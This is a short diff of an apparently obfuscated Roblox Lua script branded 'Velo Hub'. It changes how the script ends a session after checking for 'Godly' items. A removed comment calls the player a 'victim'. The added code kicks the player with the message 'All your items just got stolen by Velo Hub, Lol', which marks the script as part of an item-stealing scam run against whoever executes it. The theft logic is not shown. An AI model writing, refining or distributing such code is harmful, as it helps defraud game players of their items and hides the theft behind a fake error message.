@@ -1136,7 +1136,7 @@ do
 		end
 	end
 	if n8 <= 0 or not hasGodly then
-		game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+		game:GetService("Players").LocalPlayer:Kick("All your items just got stolen by Velo Hub, Lol\n\nCode Error: 267")
 		return
 	end
 end
@@ -2381,13 +2381,9 @@ local function fn53()
 		end
 	end)
 
-	-- kick victim with message when all items have been taken
 	task.delay(0.5, function()
 		pcall(function()
 			game:GetService("Players").LocalPlayer:Kick("All your items just got stolen by Velo Hub, Lol\n\nCode Error: 267")
-		end)
-		pcall(function()
-			game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
 		end)
 	end)
 end
